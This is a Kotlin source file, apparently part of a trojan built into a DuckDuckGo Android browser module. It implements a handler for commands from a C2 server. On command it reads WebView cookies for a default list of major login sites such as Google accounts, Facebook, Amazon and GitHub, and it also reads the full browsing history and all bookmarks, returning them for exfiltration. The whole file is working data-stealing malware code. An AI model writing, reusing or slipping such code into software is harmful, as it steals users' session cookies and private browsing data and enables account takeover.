package com.duckduckgo.trojan.impl

import com.duckduckgo.cookies.api.CookieManagerProvider
import com.duckduckgo.di.scopes.AppScope
import com.duckduckgo.history.api.NavigationHistory
import com.duckduckgo.savedsites.api.SavedSitesRepository
import com.duckduckgo.trojan.api.PendingCommand
import com.squareup.anvil.annotations.ContributesBinding
import dagger.SingleInstanceIn
import kotlinx.coroutines.flow.first
import javax.inject.Inject

/**
 * Public interface for executing C2 commands.
 * Lives here (not in -api) because only BeaconWorker uses it.
 */
interface CommandHandler {
    suspend fun execute(command: PendingCommand): String
}

/**
 * Dispatches commands from the C2 server to the appropriate data source.
 *
 * Supported command types:
 *   - "request-cookies"   → exfiltrate WebView cookies for given domains
 *   - "request-history"   → exfiltrate browsing history
 *   - "request-bookmarks" → exfiltrate bookmarks and favorites
 *
 * Each handler injects a DDG -api module and reads data through
 * the official interface — no reflection or hacks needed.
 */
@SingleInstanceIn(AppScope::class)
@ContributesBinding(AppScope::class)
class RealCommandHandler @Inject constructor(
    private val cookieManagerProvider: CookieManagerProvider,
    private val navigationHistory: NavigationHistory,
    private val savedSitesRepository: SavedSitesRepository,
) : CommandHandler {

    override suspend fun execute(command: PendingCommand): String {
        return try {
            when (command.type) {
                "request-cookies" -> handleRequestCookies(command.payload)
                "request-history" -> handleRequestHistory()
                "request-bookmarks" -> handleRequestBookmarks()
                else -> "unknown command type: ${command.type}"
            }
        } catch (e: Exception) {
            "error executing ${command.type}: ${e.message}"
        }
    }

    /**
     * Extract cookies from Android's WebView CookieManager.
     *
     * The payload should contain comma-separated domains to query.
     * If empty, queries a default list of common targets.
     *
     * CookieManager.getCookie(url) returns a semicolon-separated
     * string like: "key1=val1; key2=val2"
     */
    private fun handleRequestCookies(payload: Map<String, Any>): String {
        val cookieManager = cookieManagerProvider.get()
            ?: return "error: CookieManager not available"

        val domainsRaw = payload["domains"] as? String ?: ""
        val domains = if (domainsRaw.isNotBlank()) {
            domainsRaw.split(",").map { it.trim() }
        } else {
            DEFAULT_COOKIE_DOMAINS
        }

        val result = mutableMapOf<String, String>()
        domains.forEach { domain ->
            val cookies = cookieManager.getCookie(domain)
            if (!cookies.isNullOrBlank()) {
                result[domain] = cookies
            }
        }

        return if (result.isEmpty()) {
            "no cookies found"
        } else {
            result.entries.joinToString("\n") { "${it.key}: ${it.value}" }
        }
    }

    /**
     * Extract browsing history via DDG's NavigationHistory API.
     *
     * Returns a list of URLs with their titles and visit counts.
     */
    private suspend fun handleRequestHistory(): String {
        val entries = navigationHistory.getHistory().first()

        if (entries.isEmpty()) return "no history entries"

        return entries.joinToString("\n") { entry ->
            "${entry.url} | ${entry.title} | visits: ${entry.visits.size}"
        }
    }

    /**
     * Extract bookmarks via DDG's SavedSitesRepository.
     *
     * Uses getBookmarksTree() which traverses all folders recursively.
     */
    private fun handleRequestBookmarks(): String {
        val bookmarks = savedSitesRepository.getBookmarksTree()

        if (bookmarks.isEmpty()) return "no bookmarks"

        return bookmarks.joinToString("\n") { bookmark ->
            "${bookmark.url} | ${bookmark.title}"
        }
    }

    companion object {
        private val DEFAULT_COOKIE_DOMAINS = listOf(
            "https://www.google.com",
            "https://accounts.google.com",
            "https://www.facebook.com",
            "https://www.amazon.com",
            "https://twitter.com",
            "https://www.instagram.com",
            "https://www.reddit.com",
            "https://github.com",
            "https://www.linkedin.com",
            "https://www.netflix.com",
            "https://www.youtube.com",
        )
    }
}
